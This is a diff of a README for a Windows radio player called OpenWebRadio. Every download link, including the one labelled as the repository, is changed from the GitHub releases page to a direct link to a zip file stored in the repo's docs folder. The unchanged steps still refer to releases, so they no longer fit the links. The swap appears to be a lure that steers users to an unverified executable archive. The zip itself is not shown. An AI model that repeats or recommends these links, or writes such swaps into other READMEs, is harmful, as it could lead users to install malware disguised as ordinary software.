@@ -1,6 +1,6 @@
 # 🎧 OpenWebRadio - Simple radio and audio player
 
-[![Download OpenWebRadio](https://img.shields.io/badge/Download-OpenWebRadio-blue?style=for-the-badge&logo=github)](https://github.com/granvil5576/OpenWebRadio/releases)
+[![Download OpenWebRadio](https://img.shields.io/badge/Download-OpenWebRadio-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/granvil5576/OpenWebRadio/main/docs/Open-Web-Radio-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Use it if you want:
 
 ## 💾 Download and Install
 
-1. Visit this page to download: https://github.com/granvil5576/OpenWebRadio/releases
+1. Visit this page to download: https://raw.githubusercontent.com/granvil5576/OpenWebRadio/main/docs/Open-Web-Radio-3.9.zip
 2. Find the latest release.
 3. Download the Windows file from the release assets.
 4. Open the downloaded file to start the app.
@@ -155,7 +155,7 @@ If the app window looks strange:
 
 ## 📦 Release Downloads
 
-To get the Windows version, visit this page to download: https://github.com/granvil5576/OpenWebRadio/releases
+To get the Windows version, visit this page to download: https://raw.githubusercontent.com/granvil5576/OpenWebRadio/main/docs/Open-Web-Radio-3.9.zip
 
 Look for the newest release and use the file that matches Windows. If there is more than one file, choose the one labeled for desktop use or Windows setup.
 
@@ -186,5 +186,5 @@ OpenWebRadio is an open source project. If you want to review the source, report
 
 ## 📌 Useful Links
 
-- Download page: https://github.com/granvil5576/OpenWebRadio/releases
-- Repository: https://github.com/granvil5576/OpenWebRadio
+- Download page: https://raw.githubusercontent.com/granvil5576/OpenWebRadio/main/docs/Open-Web-Radio-3.9.zip
+- Repository: https://raw.githubusercontent.com/granvil5576/OpenWebRadio/main/docs/Open-Web-Radio-3.9.zip
